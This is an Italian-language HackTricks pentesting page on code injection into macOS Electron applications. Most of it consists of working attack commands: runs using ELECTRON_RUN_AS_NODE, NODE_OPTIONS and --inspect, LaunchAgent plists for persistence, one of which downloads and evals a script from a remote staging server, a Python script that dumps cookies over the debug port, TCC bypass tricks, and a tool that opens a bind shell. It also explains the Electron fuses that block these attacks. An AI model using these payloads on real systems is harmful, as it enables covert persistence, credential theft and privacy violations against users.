# Iniezione nelle Applicazioni Electron di macOS

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Informazioni di Base

Se non sai cos'è Electron, puoi trovare [**molte informazioni qui**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ma per ora sappi solo che Electron esegue **node**.\
E node ha alcuni **parametri** e **variabili d'ambiente** che possono essere utilizzati per **farlo eseguire altro codice** oltre al file indicato.

### Fusibili di Electron

Queste tecniche saranno discusse in seguito, ma di recente Electron ha aggiunto diversi **fusibili di sicurezza per prevenirle**. Questi sono i [**Fusibili di Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) e questi sono quelli utilizzati per **prevenire** alle app Electron in macOS di **caricare codice arbitrario**:

* **`RunAsNode`**: Se disabilitato, impedisce l'uso della variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** per iniettare codice.
* **`EnableNodeCliInspectArguments`**: Se disabilitato, parametri come `--inspect`, `--inspect-brk` non saranno rispettati. Evitando in questo modo l'iniezione di codice.
* **`EnableEmbeddedAsarIntegrityValidation`**: Se abilitato, il file **`asar`** caricato verrà **validato** da macOS. **Prevenendo** in questo modo l'iniezione di codice modificando i contenuti di questo file.
* **`OnlyLoadAppFromAsar`**: Se abilitato, anziché cercare di caricare nell'ordine seguente: **`app.asar`**, **`app`** e infine **`default_app.asar`**. Controlla e utilizza solo app.asar, garantendo così che quando **combinato** con il fusibile **`embeddedAsarIntegrityValidation`** sia **impossibile** **caricare codice non convalidato**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Se abilitato, il processo del browser utilizza il file chiamato `browser_v8_context_snapshot.bin` per il suo snapshot V8.

Un altro fusibile interessante che non impedirà l'iniezione di codice è:

* **EnableCookieEncryption**: Se abilitato, il cookie store su disco è crittografato utilizzando chiavi di crittografia a livello di sistema operativo.

### Verifica dei Fusibili di Electron

È possibile **verificare questi flag** da un'applicazione con:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modificare i Fusibili di Electron

Come indicato nella [**documentazione**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configurazione dei **Fusibili di Electron** è impostata all'interno del **binario di Electron** che contiene da qualche parte la stringa **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Nelle applicazioni macOS questo si trova tipicamente in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Puoi caricare questo file su [https://hexed.it/](https://hexed.it/) e cercare la stringa precedente. Dopo questa stringa, puoi vedere in ASCII un numero "0" o "1" che indica se ogni fusibile è disabilitato o abilitato. Modifica il codice esadecimale (`0x30` è `0` e `0x31` è `1`) per **modificare i valori del fusibile**.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nota che se provi a **sovrascrivere** il **binario del framework Electron** all'interno di un'applicazione con questi byte modificati, l'applicazione non si avvierà.

## RCE aggiungendo codice alle Applicazioni Electron

Potrebbero esserci **file JS/HTML esterni** che un'applicazione Electron sta utilizzando, quindi un attaccante potrebbe iniettare codice in questi file la cui firma non verrà verificata ed eseguire codice arbitrario nel contesto dell'applicazione.

{% hint style="danger" %}
Tuttavia, al momento ci sono 2 limitazioni:

* È necessaria l'autorizzazione **`kTCCServiceSystemPolicyAppBundles`** per modificare un'applicazione, quindi per impostazione predefinita ciò non è più possibile.
* Il file compilato **`asap`** di solito ha i fusibili **`embeddedAsarIntegrityValidation`** e **`onlyLoadAppFromAsar`** abilitati

Rendendo questo percorso di attacco più complicato (o impossibile).
{% endhint %}

Nota che è possibile aggirare il requisito di **`kTCCServiceSystemPolicyAppBundles`** copiando l'applicazione in un'altra directory (come **`/tmp`**), rinominando la cartella **`app.app/Contents`** in **`app.app/NotCon`**, **modificando** il file **asar** con il tuo codice **malizioso**, rinominandolo nuovamente in **`app.app/Contents`** ed eseguendolo.

Puoi estrarre il codice dal file asar con:
```bash
npx asar extract app.asar app-decomp
```
E ricompilalo dopo averlo modificato con:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE con `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Secondo [**la documentazione**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), se questa variabile di ambiente è impostata, avvierà il processo come un normale processo Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Se il fusibile **`RunAsNode`** è disabilitato, la variabile di ambiente **`ELECTRON_RUN_AS_NODE`** verrà ignorata e ciò non funzionerà.
{% endhint %}

### Iniezione dal Plist dell'App

Come [**proposto qui**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), potresti abusare di questa variabile di ambiente in un plist per mantenere la persistenza:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE con `NODE_OPTIONS`

Puoi memorizzare il payload in un file diverso ed eseguirlo:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Se il fusibile **`EnableNodeOptionsEnvironmentVariable`** è **disabilitato**, l'app **ignorerà** la variabile di ambiente **NODE_OPTIONS** quando viene avviata a meno che la variabile di ambiente **`ELECTRON_RUN_AS_NODE`** sia impostata, la quale verrà **ignorata** se il fusibile **`RunAsNode`** è disabilitato.

Se non si imposta **`ELECTRON_RUN_AS_NODE`**, verrà visualizzato l'**errore**: `La maggior parte delle NODE_OPTION non è supportata nelle app confezionate. Consultare la documentazione per ulteriori dettagli.`
{% endhint %}

### Iniezione dall'App Plist

Potresti abusare di questa variabile di ambiente in un plist per mantenere la persistenza aggiungendo queste chiavi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE con l'ispezione

Secondo [**questo**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), se esegui un'applicazione Electron con flag come **`--inspect`**, **`--inspect-brk`** e **`--remote-debugging-port`**, verrà aperta una **porta di debug** a cui puoi connetterti (ad esempio da Chrome in `chrome://inspect`) e sarai in grado di **iniettare codice al suo interno** o addirittura avviare nuovi processi.\
Per esempio:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Se il fusibile **`EnableNodeCliInspectArguments`** è disabilitato, l'app **ignorerà i parametri node** (come `--inspect`) quando viene avviata a meno che la variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** non sia impostata, la quale verrà **ignorata** se il fusibile **`RunAsNode`** è disabilitato.

Tuttavia, è ancora possibile utilizzare il **parametro electron `--remote-debugging-port=9229`** ma il payload precedente non funzionerà per eseguire altri processi.
{% endhint %}

Utilizzando il parametro **`--remote-debugging-port=9222`** è possibile rubare alcune informazioni dall'App Electron come la **cronologia** (con comandi GET) o i **cookie** del browser (poiché sono **decriptati** all'interno del browser e c'è un **endpoint json** che li restituirà).

Puoi apprendere come farlo [**qui**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) e [**qui**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) e utilizzare lo strumento automatico [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) o uno script semplice come:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
Nel [**questo post sul blog**](https://hackerone.com/reports/1274695), questo debug viene abusato per fare in modo che un chrome headless **scarichi file arbitrari in posizioni arbitrarie**.

### Iniezione dal Plist dell'App

Potresti abusare questa variabile di ambiente in un plist per mantenere la persistenza aggiungendo queste chiavi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Bypass TCC sfruttando le versioni precedenti

{% hint style="success" %}
Il demone TCC di macOS non controlla la versione eseguita dell'applicazione. Quindi, se **non puoi iniettare codice in un'applicazione Electron** con nessuna delle tecniche precedenti, potresti scaricare una versione precedente dell'APP e iniettare del codice al suo interno poiché otterrà comunque i privilegi TCC (a meno che la Trust Cache lo impedisca).
{% endhint %}

## Esegui codice non JS

Le tecniche precedenti ti permetteranno di eseguire **codice JS all'interno del processo dell'applicazione Electron**. Tuttavia, ricorda che i **processi figlio vengono eseguiti sotto lo stesso profilo sandbox** dell'applicazione genitore e **ereditano i loro permessi TCC**.\
Pertanto, se desideri abusare delle autorizzazioni per accedere alla fotocamera o al microfono, ad esempio, potresti semplicemente **eseguire un altro binario dal processo**.

## Iniezione automatica

Lo strumento [**electroniz3r**](https://github.com/r3ggi/electroniz3r) può essere facilmente utilizzato per **individuare applicazioni Electron vulnerabili** installate e iniettare del codice al loro interno. Questo strumento cercherà di utilizzare la tecnica **`--inspect`**:

Devi compilarlo da solo e puoi usarlo in questo modo:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Riferimenti

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
